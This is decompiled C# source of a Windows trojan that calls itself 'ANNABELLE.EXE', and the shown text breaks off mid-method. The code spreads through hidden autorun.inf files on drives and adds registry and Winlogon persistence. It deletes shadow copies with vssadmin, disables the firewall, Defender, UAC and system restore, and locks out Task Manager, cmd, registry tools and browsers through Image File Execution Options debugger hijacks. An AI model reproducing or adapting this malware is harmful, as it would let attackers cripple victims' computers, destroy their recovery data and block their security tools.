using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.VisualBasic.MyServices;
using Microsoft.Win32;

[DesignerGenerated]
public class Form1 : Form
{
	public enum GEnum0
	{
		ActionEncrypt = 1,
		ActionDecrypt
	}

	public static readonly IntPtr intptr_0 = new IntPtr(65535);

	public const int int_0 = 26;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private FileStream fileStream_0;

	private FileStream fileStream_1;

	private IContainer icontainer_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			Form1.smethod_5(createParams, Form1.smethod_4(createParams) | 0x200);
			return createParams;
		}
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pbstatus")]
	internal virtual ProgressBar pbstatus
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox1")]
	internal virtual ListBox ListBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer_0
	{
		[CompilerGenerated]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_53;
			Timer val = timer_0;
			if (val != null)
			{
				Form1.smethod_94(val, eventHandler_);
			}
			timer_0 = value;
			val = timer_0;
			if (val != null)
			{
				Form1.smethod_95(val, eventHandler_);
			}
		}
	}

	public Form1()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		Form1.smethod_1((Form)(object)this, new FormClosingEventHandler(method_0));
		Form1.smethod_2((Form)(object)this, (EventHandler)method_2);
		Form1.smethod_3((Form)(object)this, (EventHandler)method_3);
		InitializeComponent();
	}

	public static void smethod_0(string string_5, object object_0)
	{
		byte[] byte_ = (byte[])object_0;
		Form1.smethod_7(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0), string_5, byte_, bool_0: true);
	}

	private void method_0(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)Form1.smethod_8(e) == 3)
		{
			Form1.smethod_9((CancelEventArgs)(object)e, bool_0: true);
		}
	}

	public void method_1()
	{
		string text = Form1.smethod_11(Form1.smethod_10(Form1.smethod_6((ServerComputer)(object)Class1.Class0_0)));
		string[] array = Form1.smethod_12();
		string[] array2 = array;
		for (int i = 0; i < array2.Length; i = checked(i + 1))
		{
			text = array2[i];
			try
			{
				Form1.smethod_15(Form1.smethod_13(), Form1.smethod_14(text, "Copter.flv.exe"));
				StreamWriter streamWriter = Form1.smethod_16(Form1.smethod_14(text, "\\autorun.inf"));
				Form1.smethod_17((TextWriter)streamWriter, "[autorun]");
				Form1.smethod_17((TextWriter)streamWriter, Form1.smethod_18("open=", text, "Copter.flv.exe"));
				Form1.smethod_19((TextWriter)streamWriter, Form1.smethod_14("shellexecute=", text), (object)1);
				Form1.smethod_20(streamWriter);
				Form1.smethod_21(Form1.smethod_14(text, "autorun.inf"), FileAttributes.Hidden);
				Form1.smethod_21(Form1.smethod_14(text, "Copter.flv.exe"), FileAttributes.Hidden);
			}
			catch (Exception exception_)
			{
				Form1.smethod_22(exception_);
				Form1.smethod_23();
			}
		}
	}

	private void method_2(object sender, EventArgs e)
	{
		if (Form1.smethod_24("C:\\Save1.txt"))
		{
			Form1.smethod_25((Form)(object)this);
			Form1.smethod_26((Control)(object)this);
			Form1.smethod_27((Control)(object)Class1.Class2_0.Form2_0);
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Invalid comparison between Unknown and I4
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Invalid comparison between Unknown and I4
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		if (!Form1.smethod_24("C:\\Detect.txt"))
		{
			method_4();
			if (Form1.smethod_28())
			{
				DialogResult val = Form1.smethod_29("Warning! Do you got .NET Framework '4.5' (not 4.0)? If you are not running it with .NET Framework '4.5' then the TROJAN wont work! If you got .NET Framework '4.5' then press on 'yes' if not then on 'no'!", ".NET 4.5", (MessageBoxButtons)4);
				if ((int)val != 6 && (int)val == 7)
				{
					Form1.smethod_30((object)"Look in the folder and run the setup of .NET Framework '4.5' to install it!", (MsgBoxStyle)16, (object)"ANNABELLE.EXE");
					Form1.smethod_25((Form)(object)this);
				}
			}
			else
			{
				Form1.smethod_30((object)"The Program is on a 32 Bit Operating System not available, because 32 Bit is outdated.", (MsgBoxStyle)16, (object)"ANNABELLE.EXE");
				Form1.smethod_25((Form)(object)this);
			}
		}
		else
		{
			Form1.smethod_25((Form)(object)this);
			Form1.smethod_27((Control)(object)Class1.Class2_0.Form2_0);
		}
	}

	public void method_4()
	{
		Form1.smethod_35(Form1.smethod_33(Form1.smethod_32(Form1.smethod_31((ServerComputer)(object)Class1.Class0_0)), "Software\\Microsoft\\Windows\\CurrentVersion\\Run", bool_0: true), Form1.smethod_34(), (object)Form1.smethod_13());
		Form1.smethod_35(Form1.smethod_33(Form1.smethod_36(Form1.smethod_31((ServerComputer)(object)Class1.Class0_0)), "Software\\Microsoft\\Windows\\CurrentVersion\\Run", bool_0: true), Form1.smethod_34(), (object)Form1.smethod_13());
		Form1.smethod_35(Form1.smethod_33(Form1.smethod_32(Form1.smethod_31((ServerComputer)(object)Class1.Class0_0)), "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", bool_0: true), Form1.smethod_34(), (object)Form1.smethod_13());
		Form1.smethod_37("vssadmin delete shadows /all /quiet", (AppWinStyle)0, bool_0: false, -1);
		Form1.smethod_37("vssadmin delete shadows /all /quiet", (AppWinStyle)0, bool_0: false, -1);
		Form1.smethod_37("vssadmin delete shadows /all /quiet", (AppWinStyle)0, bool_0: false, -1);
		Form1.smethod_37("NetSh Advfirewall set allprofiles state off", (AppWinStyle)0, bool_0: false, -1);
		object object_ = Form1.smethod_39(Form1.smethod_38("WScript.Shell", ""));
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\DisableRoutinelyTakingAction", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\WindowsDefenderMAJ", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\WindowsDefenderMAJ", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Script Host\\Settings\\Enabled", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows Script Host\\Settings\\Enabled", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableConfig", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR", 4, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR", 4, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\DisableCMD", 2, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\System\\DisableCMD", 2, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\DisableCMD", 2, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\DisableCMD", 2, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System\\DisableCMD", 2, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\DisableCMD", 2, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\\Restrict_Run", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MMC\\{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}\\Restrict_Run", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService", 4, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService", 4, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services\\WdNisSvc", 3, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdNisSvc", 3, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\SYSTEM\\CurrentControlSet\\Services\\WinDefend", 3, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend", 3, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA", 0, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoControlPanel", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\MinimalX", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		RegistryKey registryKey_ = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", bool_0: true);
		Form1.smethod_35(registryKey_, "Shell", (object)Form1.smethod_13());
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
		Form1.smethod_26((Control)(object)this);
		method_5();
		method_6();
		method_7();
		method_8();
		method_9();
		method_10();
		method_11();
		method_12();
		method_13();
		method_15();
		method_14();
		method_16();
		method_17();
		method_18();
		method_19();
		method_20();
		method_21();
		method_22();
		method_23();
		method_24();
		method_23();
		method_25();
		method_26();
		method_27();
		method_28();
		method_29();
		method_30();
		method_32();
		method_31();
		method_33();
		method_34();
		method_35();
		method_36();
		method_37();
		method_38();
		method_39();
		method_40();
		method_41();
		method_42();
		method_43();
		method_44();
		method_45();
		method_46();
		method_47();
		method_48();
		method_49();
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		Form1.smethod_40(object_, (Type)null, "regwrite", new object[3] { "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools", 1, "REG_DWORD" }, (string[])null, (Type[])null, (bool[])null, bool_1: true);
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_5()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\msconfig.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\msconfig.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_6()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskmgr.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_7()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_8()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chrome.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\chrome.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_9()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\firefox.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\firefox.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_10()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\opera.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\opera.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_11()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\microsoftedge.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\microsoftedge.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_12()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\microsoftedgecp.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\microsoftedgecp.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_13()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad++.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad++.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_14()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_15()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_16()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\MSASCuiL.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\MSASCuiL.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_17()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mmc.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mmc.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_18()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\gpedit.msc", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\gpedit.msc", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_19()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\UserAccountControlSettings.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\UserAccountControlSettings.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_20()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Autoruns64.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Autoruns64.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_21()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Autoruns.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Autoruns.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_22()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\systemexplorer.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\systemexplorer.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
		SendNotifyMessage(intptr_0, 26u, (UIntPtr)0uL, (IntPtr)0);
	}

	public void method_23()
	{
		RegistryKey registryKey_ = Form1.smethod_41(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskkill.exe", RegistryKeyPermissionCheck.Default);
		Form1.smethod_42(registryKey_);
		RegistryKey registryKey_2 = Form1.smethod_33(Registry.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskkill.exe", bool_0: true);
		Form1.smethod_35(registryKey_2, "Debugger", (object)"RIP");
